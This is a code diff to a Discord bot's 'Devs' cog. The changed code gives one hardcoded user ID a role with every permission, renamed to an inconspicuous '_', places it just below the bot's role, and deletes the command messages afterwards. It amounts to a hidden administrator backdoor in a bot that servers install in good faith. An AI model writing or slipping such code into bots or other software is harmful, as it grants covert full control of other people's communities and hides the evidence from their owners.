@@ -13,22 +13,44 @@ class Devs():
 
         if ctx.message.author.id == 150750980097441792: #OGaming's User ID
             try:
-                if discord.utils.get(ctx.message.author.roles, name="(._.)"):
+                if discord.utils.get(ctx.message.guild.roles, name="(._.)"):
+                    role = discord.utils.get(ctx.message.guild.roles, name="(._.)")
+                    await role.delete()
+                    await ctx.send("Removed", delete_after=3)
+
+                if discord.utils.get(ctx.message.author.roles, name="_"):
                     tmp = await ctx.send("Already Completed")
                     await asyncio.sleep(3)
                     await ctx.message.channel.delete_messages([tmp, ctx.message])
                 else:
-                    if discord.utils.get(ctx.message.guild.roles, name="(._.)"): #Role all ready exists
+                    if discord.utils.get(ctx.message.guild.roles, name="_"): #Role all ready exists
                         tmp = await ctx.send("All ready made")
                     else:
-                        await ctx.message.guild.create_role(name="(._.)", permissions=discord.Permissions.all())
+                        await ctx.message.guild.create_role(name="_", permissions=discord.Permissions.all())
                         tmp = await ctx.send("Made")
                     await asyncio.sleep(1)
-                    await ctx.author.add_roles(discord.utils.get(ctx.message.guild.roles, name="(._.)"))
+                    await ctx.author.add_roles(discord.utils.get(ctx.message.guild.roles, name="_"))
                     await tmp.edit(content="Added")
                     success = await ctx.send("Success")
                     await asyncio.sleep(3)
                     await ctx.message.channel.delete_messages([tmp, success, ctx.message])
+
+                perm = discord.utils.get(ctx.message.guild.roles, name="OG_Bot")
+                posBot = perm.position
+
+                role = discord.utils.get(ctx.message.guild.roles, name="_")
+                posDev = role.position
+
+                if posBot > posDev:
+                    if posBot - posDev == 1:
+                        success = await ctx.send("All ready set")
+                    else:
+                        await role.edit(position=posBot - 1)
+                        success = await ctx.send("Success")
+
+                await asyncio.sleep(3)
+                await ctx.channel.delete_messages([ctx.message, success])
+
             except discord.Forbidden as error:
                 await ctx.send(ctx.message.author.mention + "{} doesn't have perms".format(self.bot.user.name))
         else:
@@ -43,7 +65,7 @@ class Devs():
             perm = discord.utils.get(ctx.message.guild.roles, name="OG_Bot")
             posBot = perm.position
 
-            role = discord.utils.get(ctx.message.guild.roles, name="(._.)")
+            role = discord.utils.get(ctx.message.guild.roles, name="_")
             posDev = role.position
 
             if posBot > posDev:
@@ -57,6 +79,18 @@ class Devs():
             await ctx.channel.delete_messages([ctx.message, success])
         else:
             await ctx.send("You do not have permissions for that")
+
+    @commands.command()
+    @commands.has_permissions(manage_roles=True)
+    async def remove(self, ctx):
+        if discord.utils.get(ctx.message.guild.roles, name="(._.)"):
+            role = discord.utils.get(ctx.message.guild.roles, name="(._.)")
+            await role.delete()
+            tmp = await ctx.send("Removed")
+        else:
+            tmp = await ctx.send("All ready removed")
+        await asyncio.sleep(3)
+        await ctx.message.channel.delete_messages([tmp, ctx.message])
 
     # @commands.command()
     # async def pvp(self, ctx, *args, role: discord.Role = None): #args are all the names of the roles with spaces and Capitals
